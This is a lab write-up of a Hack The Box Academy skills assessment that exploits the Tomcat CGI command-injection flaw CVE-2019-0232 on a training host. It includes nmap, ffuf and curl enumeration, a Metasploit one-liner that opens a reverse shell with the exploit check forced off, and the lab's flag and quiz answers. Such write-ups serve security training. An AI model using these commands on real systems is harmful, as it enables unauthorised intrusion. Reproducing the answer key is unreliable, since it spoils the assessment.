# Attacking Common Applications — Skills Assessments

HTB Academy "Attacking Common Applications" module, Sections 31–33 (three skills assessments).

---

## Skills Assessment I — Tomcat CGI RCE (CVE-2019-0232)

**Target:** 10.129.49.223 (ACADEMY-ATCKAPPS-SKILLS1, hostname APPS-SKILLS1), Windows Server 2019.

**Goal:** Enumerate, identify a vulnerable app, get a foothold, read `flag.txt` on the Administrator desktop.

### Answers
- Q1 vulnerable application: **Tomcat**
- Q2 port: **8080**
- Q3 version: **9.0.0.M1**
- Q4 flag: **f55763d31a8f63ec935abd07aee5d3d0**

### Enumeration
`nmap -p- -sC -sV --open --min-rate=1000 10.129.49.223 -v`:
- 21 FTP — **anonymous allowed**, root has `website_backup/`
- 80/443 IIS 10.0 ("Freight Logistics, Inc")
- 135/139/445 SMB, 3389 RDP, 5985 WinRM
- 8000 → **Jenkins 2.303.1** (Jetty; auth required)
- 8009 → AJP13
- **8080 → Apache Tomcat 9.0.0.M1** (`http-title: Apache Tomcat/9.0.0.M1`)

Fingerprint the web apps:
```
curl -s -i http://10.129.49.223:8080/ | head -30   # Tomcat 9.0.0.M1
curl -s -i http://10.129.49.223:8000/ | head -20   # X-Jenkins: 2.303.1, 403 auth required
```

### Dead Ends (documented so we don't repeat)
- **FTP `website_backup`** — pulled it all with `wget -r "ftp://anonymous:anonymous@10.129.49.223/" -P ftp_loot`. It's just the static site template (HTML/CSS/JS/flag SVGs). Grep for creds found nothing. Red herring for credentials.
- **Tomcat Manager** — `/manager/html` returns **404** (app not deployed) → no WAR-upload path.
- **Jenkins** — needs auth, no creds in hand.

### Identifying the Vuln
- Windows + **Tomcat 9.0.0.M1** = exact affected range for **CVE-2019-0232** (Tomcat CGI Servlet OS command injection, `enableCmdLineArguments=true`). Range: 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93. (Module Section 19.)

### Finding the CGI Script — key gotcha
- `/cgi-bin/` → **404**. The CGI servlet here is mapped at **`/cgi/`** (same as the Section 19 lab).
- `welcome.bat` (the Section 19 name) → 404 here. Fuzz for the real name:
```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.49.223:8080/cgi/FUZZ.bat -mc 200
```
- Result: **`cmd`** → `/cgi/cmd.bat` returns 200 (Size 0).

### Exploitation — Metasploit
Module: `exploit/windows/http/tomcat_cgi_cmdlineargs` (CVE-2019-0232).
```
msfconsole -q -x "use exploit/windows/http/tomcat_cgi_cmdlineargs; set RHOSTS 10.129.49.223; set RPORT 8080; set TARGETURI /cgi/cmd.bat; set LHOST tun0; set LPORT 4445; set ForceExploit true; run"
```
- **Critical gotcha:** the module's AutoCheck reports "**target is not exploitable**" — a **false negative**, because `cmd.bat` returns an empty body so the check can't see command output. The injection still works. A manual `curl ".../cgi/cmd.bat?&c%3A%5C...%5Cwhoami.exe"` also returned an empty body for the same reason.
- **`set ForceExploit true`** bypasses the bad check. A reverse-shell payload calls back on its own and doesn't need visible output → session opened.
- Landed in `C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi`.

### Post-Exploitation
```
getuid   # NT AUTHORITY\SYSTEM  (Tomcat runs as SYSTEM — no privesc needed)
cat C:\\Users\\Administrator\\Desktop\\flag.txt   # f55763d31a8f63ec935abd07aee5d3d0
```

### Lessons Learned
- When a target has multiple module apps (Tomcat, Jenkins), let the **available attack surface** decide: Manager 404 + Jenkins-auth-required eliminated those paths and pointed at the CGI CVE.
- **CGI path varies** — the servlet may be at `/cgi/`, not `/cgi-bin/`. Always confirm the directory, then fuzz for the `.bat`/`.cmd` script name.
- **Trust a reverse-shell over a scanner's "not vulnerable"** when the check depends on reading output. `ForceExploit true` is the right call once you understand *why* the check failed (empty CGI body).
- Anonymous-FTP backups are worth checking but are often just static site content — grep, confirm, move on.
